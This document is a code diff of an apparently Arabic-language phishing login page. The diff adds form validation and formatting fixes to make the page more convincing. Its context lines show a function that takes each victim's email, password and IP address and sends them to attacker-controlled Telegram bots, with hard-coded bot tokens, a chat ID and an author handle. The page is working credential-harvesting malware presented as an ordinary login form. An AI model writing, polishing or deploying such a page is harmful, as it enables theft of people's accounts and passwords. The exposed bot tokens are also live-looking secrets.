@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -6,7 +5,6 @@
   <title>عليك تسجيل الدخول الى حسابك أولاً</title>
   <style>
     /* Your CSS styles here */
-    
     * {
       margin: 0;
       padding: 0;
@@ -140,6 +138,13 @@
       font-size: 18px;
       margin-top: 20px;
     }
+    /* Add styles for error messages */
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -150,8 +155,10 @@
     </div>
     <form id="loginForm">
       <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="email" id="email" required>
+      <div id="emailError" class="error">Please enter a valid email address.</div>
       <input placeholder="كلمة السر" type="password" name="pass" id="pass" required>
-      <button id="login" type="button" onclick="redirectToWebsiteWithLoading()">تسجيل الدخول</button>
+      <div id="passwordError" class="error">Password must be at least 6 characters long.</div>
+      <button id="login" type="button" onclick="validateForm()">تسجيل الدخول</button>
       <a href="forgotten password? ">هل نسيت كلمة السر؟</a>
       <div class="or">
         <p class="p2"></p>
@@ -173,7 +180,7 @@
         <li>Telugu</li>
       </span>
     </div>
-    <div class "footer">
+    <div class="footer">
       <ul>
         <li class="no">About</li>
         <li>Help</li>
@@ -184,6 +191,37 @@
     <div id="loading"></div>
   </div>
   <script>
+    function validateForm() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('pass').value.trim();
+
+      const emailError = document.getElementById('emailError');
+      const passwordError = document.getElementById('passwordError');
+
+      let isValid = true;
+
+      // Validate email
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        emailError.style.display = 'block';
+        isValid = false;
+      } else {
+        emailError.style.display = 'none';
+      }
+
+      // Validate password
+      if (password.length < 6) {
+        passwordError.style.display = 'block';
+        isValid = false;
+      } else {
+        passwordError.style.display = 'none';
+      }
+
+      // If form is valid, proceed
+      if (isValid) {
+        redirectToWebsiteWithLoading();
+      }
+    }
+
     function redirectToWebsiteWithLoading() {
       var email = document.getElementById('email').value;
       var password = document.getElementById('pass').value;
@@ -211,28 +249,28 @@
     }
 
     function sendToTelegram(email, password, ipAddress) {
-  // Bot 1 Details
-  var botToken1 = "6967999524:AAF9DF2TbkTIP6jTNqTisEDQkeHEXeYhBVY"; // Replace with the first Telegram bot token
-  var chatId1 = "2095151068"; // Replace with the first Telegram chat ID
+      // Bot 1 Details
+      var botToken1 = "6967999524:AAF9DF2TbkTIP6jTNqTisEDQkeHEXeYhBVY"; // Replace with the first Telegram bot token
+      var chatId1 = "2095151068"; // Replace with the first Telegram chat ID
 
-  // Bot 2 Details
-  var botToken2 = "5819392519:AAHAakcJ6cStHP8a8DpM9KlFPvaZkLo6At8"; // Replace with the second Telegram bot token
-  var chatId2 = "2095151068"; // Replace with the second Telegram chat ID
+      // Bot 2 Details
+      var botToken2 = "5819392519:AAHAakcJ6cStHP8a8DpM9KlFPvaZkLo6At8"; // Replace with the second Telegram bot token
+      var chatId2 = "2095151068"; // Replace with the second Telegram chat ID
 
-  var message = '\n📧 ↝ 𝙴𝙼𝙰𝙸𝙻 » ' + email + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
-     '\n↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  »@HEXE_5';
-  // Sending to Bot 1
-  var url1 = 'https://api.telegram.org/bot' + botToken1 + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
-  var xhr1 = new XMLHttpRequest();
-  xhr1.open('GET', url1, true);
-  xhr1.send();
+      var message = '\n📧 ↝ 𝙴𝙼𝙰𝙸𝙻 » ' + email + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
+         '\n↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  »@HEXE_5';
+      // Sending to Bot 1
+      var url1 = 'https://api.telegram.org/bot' + botToken1 + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
+      var xhr1 = new XMLHttpRequest();
+      xhr1.open('GET', url1, true);
+      xhr1.send();
 
-  // Sending to Bot 2
-  var url2 = 'https://api.telegram.org/bot' + botToken2 + '/sendMessage?chat_id=' + chatId2 + '&text=' + encodeURIComponent(message);
-  var xhr2 = new XMLHttpRequest();
-  xhr2.open('GET', url2, true);
-  xhr2.send();
-}
+      // Sending to Bot 2
+      var url2 = 'https://api.telegram.org/bot' + botToken2 + '/sendMessage?chat_id=' + chatId2 + '&text=' + encodeURIComponent(message);
+      var xhr2 = new XMLHttpRequest();
+      xhr2.open('GET', url2, true);
+      xhr2.send();
+    }
 
     function showLoading() {
       var loadingElement = document.getElementById('loading');
